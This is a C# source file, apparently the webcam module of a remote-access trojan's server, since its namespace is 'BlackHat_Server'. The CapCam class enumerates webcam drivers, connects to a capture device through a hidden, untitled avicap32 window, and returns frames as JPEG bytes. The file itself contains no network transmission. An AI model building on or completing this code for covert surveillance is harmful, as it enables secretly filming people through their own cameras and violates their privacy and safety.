using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace BlackHat_Server
{
    public class CapCam
    {
        #region PINVOKE
        [DllImport("user32", EntryPoint = "SendMessage")]
        static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle,
            int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

        [DllImport("avicap32.dll")]
        extern static IntPtr capGetDriverDescription(
            ushort index,
            StringBuilder name,
            int nameCapacity,
            StringBuilder description,
            int descriptionCapacity
        );


        [DllImport("USER32.DLL")]
        static extern bool DestroyWindow(int hwnd);

        #endregion

      

        #region COSTANTI
        const int WM_CAP_CONNECT = 1034;
        const int WM_CAP_DISCONNECT = 1035;
        const int WM_CAP_COPY = 1054;
        const int WM_CAP_GET_FRAME = 1084;
        #endregion




        #region MEMBRERS

        private int hCaptureWnd = -1; // HANDLE
        ImageWorker iw = new ImageWorker();

        #endregion



        /// <summary>
        /// Trovo i drivers presenti per la webcam
        /// </summary>
        /// <returns></returns>
        public List<string> GetWCDrivers()
        {
            List<string> listaDrivers = new List<string>();

            for (ushort i = 0; i < 10; ++i)
            {
                int capacity = 200;
                StringBuilder name = new StringBuilder(capacity);
                StringBuilder description = new StringBuilder(capacity);

                if (capGetDriverDescription(i, name, capacity, description, capacity).ToInt32() > 0)
                    listaDrivers.Add(name.ToString());


            }


            return listaDrivers;
        }
        //---------------------------------

      

                 
    
        


        /// <summary>
        /// Cattura un'immagine dal device a cui sono collegato.
        /// NB PRIMA DEVO ESSERE COLEGATO AL DEVICE
        /// NULL IN CASO DI ERRORE
        /// </summary>
        /// <returns></returns>
        public byte[] Capture(int quality, int xResize, int yResize)
        {
            //Clipboard.Clear();            
            SendMessage(hCaptureWnd, WM_CAP_GET_FRAME, 0, 0);
            SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);
            
            
            Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
            if (bitmap == null)
                return null;

            Clipboard.Clear();

            return iw.ImageResizeToJpg((Image)bitmap,xResize,yResize,quality);
            

            //using (MemoryStream stream = new MemoryStream())
            //{
            //    bitmap.Save(stream, ImageFormat.Jpeg);
            //    return stream.ToArray();
            //}
        }
        //-----------------------------------------------------
      

    
        /// <summary>
        /// Avvio Connessione con Device
        /// </summary>
        public bool TryConnect(int iDevice)
        {
            try
            {
               hCaptureWnd = capCreateCaptureWindowA("", 0, 0, 0,350, 350, 0, 0);
               //int res = SendMessage(hCaptureWnd, WM_CAP_CONNECT, 0, 0);
               int res = SendMessage(hCaptureWnd, WM_CAP_CONNECT, iDevice, 0);

               Thread.Sleep(500); // warm up device

               if (res > 0)
                   return true;
               else

                   return false;
            }
            catch 
            {
                return false;
            }
        }
        //-----------------------------

        /// <summary>
        /// Disconnetto da Device
        /// NB PRIMA DEVI ESSERE CONNESSO!
        /// </summary>
        public void Disconnect()
        {
            try
            {
                int res = SendMessage(hCaptureWnd, WM_CAP_DISCONNECT, 0, 0);
                DestroyWindow(hCaptureWnd);
              
            }
            catch
            {
            }
        }
        //-----------------------------





    }
}
